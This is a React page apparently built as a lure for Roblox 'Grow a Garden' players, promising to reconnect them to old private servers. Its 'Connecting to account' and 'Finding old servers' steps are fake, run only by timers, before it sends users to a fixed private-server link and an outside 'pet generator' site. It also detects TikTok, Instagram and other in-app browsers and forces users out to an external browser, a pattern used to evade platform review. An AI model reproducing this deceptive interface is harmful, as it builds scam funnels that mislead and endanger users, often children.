"use client";

import type React from "react";
import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { Avatar, AvatarImage, AvatarFallback } from "@/components/ui/avatar";
import { Badge } from "@/components/ui/badge";
import {
  ExternalLink,
  Sparkles,
  CheckCircle,
  Loader2,
  Users,
  Clock,
  Shield,
  AlertTriangle,
} from "lucide-react";

interface RobloxUser {
  id: number;
  name: string;
  displayName: string;
  description: string;
  created: string;
  isBanned: boolean;
  externalAppDisplayName: string | null;
  hasVerifiedBadge: boolean;
  avatarUrl: string | null;
}

export default function HomePage() {
  const [username, setUsername] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [robloxUser, setRobloxUser] = useState<RobloxUser | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [showServerProcess, setShowServerProcess] = useState(false);
  const [processStep, setProcessStep] = useState(-1);
  const [showJoinButton, setShowJoinButton] = useState(false);
  const [showBrowserWarning, setShowBrowserWarning] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    const detectInAppBrowser = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera;

      const isInAppBrowser =
        /FBAN|FBAV/i.test(userAgent) || // Facebook
        /Instagram/i.test(userAgent) || // Instagram
        /Twitter/i.test(userAgent) || // Twitter
        /TikTok|musical\.ly|zhiliaoapp/i.test(userAgent) || // TikTok variations
        /Snapchat/i.test(userAgent) || // Snapchat
        /LinkedIn/i.test(userAgent) || // LinkedIn
        /WhatsApp/i.test(userAgent) || // WhatsApp
        /Telegram/i.test(userAgent) || // Telegram
        /Line/i.test(userAgent) || // Line
        /WeChat/i.test(userAgent) || // WeChat
        /MicroMessenger/i.test(userAgent) || // WeChat
        /Pinterest/i.test(userAgent) || // Pinterest
        /Reddit/i.test(userAgent); // Reddit

      if (isInAppBrowser) {
        setShowBrowserWarning(true);
      }
    };

    detectInAppBrowser();
  }, []);

  const openInBrowser = () => {
    const currentUrl = window.location.href;

    if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
      window.location.href = `x-web-search://?${currentUrl}`;
      setTimeout(() => {
        window.location.href = currentUrl;
      }, 1000);
    } else if (/Android/i.test(navigator.userAgent)) {
      window.location.href = `intent://${currentUrl.replace(/https?:\/\//, "")}#Intent;scheme=https;package=com.android.chrome;end`;
      setTimeout(() => {
        window.location.href = currentUrl;
      }, 1000);
    } else {
      window.location.reload();
    }
  };

  useEffect(() => {
    if (showServerProcess) {
      const processSteps = [
        "Connecting to account...",
        "Finding old servers...",
        "Awaiting final confirmation...",
      ];

      if (processStep === -1) {
        const timer = setTimeout(() => {
          setProcessStep(0);
        }, 500);
        return () => clearTimeout(timer);
      }

      if (processStep >= 0 && processStep < processSteps.length - 1) {
        const delay = processStep === 1 ? 3000 : 1200; // ✅ Step 2 takes 3 seconds
        const timer = setTimeout(() => {
          setProcessStep(processStep + 1);
        }, delay);
        return () => clearTimeout(timer);
      }

      if (processStep === processSteps.length - 1) {
        const timer = setTimeout(() => {
          setShowJoinButton(true);
        }, 1500);
        return () => clearTimeout(timer);
      }
    }
  }, [showServerProcess, processStep]);

  const fetchRobloxUser = async (username: string) => {
    setIsLoading(true);
    try {
      const response = await fetch(`/api/roblox-user?username=${encodeURIComponent(username)}`);

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || "Failed to fetch user");
      }

      const userData = await response.json();
      setRobloxUser(userData);
      setShowServerProcess(true);
      setProcessStep(-1);
    } catch (error) {
      toast({
        title: "User Not Found",
        description: "Could not find a Roblox user with that username",
        variant: "destructive",
      });
      setRobloxUser(null);
    } finally {
      setIsLoading(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!username.trim()) {
      toast({
        title: "Username Required",
        description: "Please enter your Roblox username",
        variant: "destructive",
      });
      return;
    }

    setShowServerProcess(false);
    setShowJoinButton(false);
    setProcessStep(-1);

    await fetchRobloxUser(username.trim());
  };

  const handlePetGenerator = () => {
    window.open("https://v0-pet-generator-growagarden.vercel.app/", "_blank");
  };

  const handleJoinServer = () => {
    window.open(
      "https://www.roblox.com/games/126884695634066/Grow-a-Garden?privateServerLinkCode=881224362243473110549436889722",
      "_blank"
    );
  };

  const processSteps = [
    "Connecting to account...",
    "Finding old servers...",
    "Awaiting final confirmation...",
  ];

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4 relative"
      style={{
        backgroundImage: "url(/grow-a-garden-bg.jpg)",
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundRepeat: "no-repeat",
      }}
    >
      {/* Browser Warning */}
      {showBrowserWarning && (
        <div className="fixed inset-0 bg-black bg-opacity-80 z-50 flex flex-col items-center justify-center text-white p-6 text-center">
          <AlertTriangle className="w-16 h-16 mb-4 text-yellow-400" />
          <h2 className="text-2xl font-bold mb-2">Open in Browser Required</h2>
          <p className="mb-4 max-w-sm">
            You are using an in-app browser (TikTok, Instagram, etc.). Please open this page in
            Chrome or Safari for the best experience.
          </p>
          <Button onClick={openInBrowser} className="bg-blue-500 hover:bg-blue-600">
            Open in Browser <ExternalLink className="ml-2 w-4 h-4" />
          </Button>
        </div>
      )}

      <Card className="w-full max-w-md backdrop-blur-lg bg-white/90 shadow-xl rounded-2xl">
        <CardContent className="p-6 space-y-6">
          <div className="text-center">
            <h1 className="text-3xl font-bold mb-2 flex items-center justify-center gap-2">
              Grow a Garden <Sparkles className="text-green-500" />
            </h1>
            <p className="text-gray-500 text-sm">Reconnect with your old private servers!</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <Input
              type="text"
              placeholder="Enter your Roblox username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full"
              disabled={isLoading}
            />
            <Button
              type="submit"
              className="w-full"
              disabled={isLoading || isSubmitting}
            >
              {isLoading ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : null}
              {isLoading ? "Checking..." : "Reconnect"}
            </Button>
          </form>

          {robloxUser && (
            <div className="mt-4 p-4 border rounded-lg bg-gray-50">
              <div className="flex items-center gap-4">
                <Avatar>
                  <AvatarImage src={robloxUser.avatarUrl || ""} />
                  <AvatarFallback>{robloxUser.name[0]}</AvatarFallback>
                </Avatar>
                <div>
                  <p className="font-bold">{robloxUser.displayName}</p>
                  <p className="text-gray-500 text-sm">@{robloxUser.name}</p>
                  {robloxUser.hasVerifiedBadge && (
                    <Badge variant="secondary" className="mt-1 flex items-center gap-1">
                      <CheckCircle className="w-3 h-3" /> Verified
                    </Badge>
                  )}
                </div>
              </div>
            </div>
          )}

          {showServerProcess && (
            <div className="mt-4 space-y-2">
              {processSteps.map((step, index) => (
                <div
                  key={index}
                  className={`flex items-center gap-2 text-sm ${
                    processStep >= index ? "text-green-600" : "text-gray-400"
                  }`}
                >
                  {processStep > index ? (
                    <CheckCircle className="w-4 h-4" />
                  ) : processStep === index ? (
                    <Loader2 className="w-4 h-4 animate-spin" />
                  ) : (
                    <Clock className="w-4 h-4" />
                  )}
                  {step}
                </div>
              ))}
            </div>
          )}

          {showJoinButton && (
            <Button onClick={handleJoinServer} className="w-full mt-4 bg-green-600 hover:bg-green-700">
              Join Private Server <Users className="ml-2 w-4 h-4" />
            </Button>
          )}

          <Button
            onClick={handlePetGenerator}
            variant="outline"
            className="w-full mt-2 border-green-500 text-green-600 hover:bg-green-50"
          >
            Try Pet Generator
          </Button>
        </CardContent>
      </Card>
    </div>
  );
}
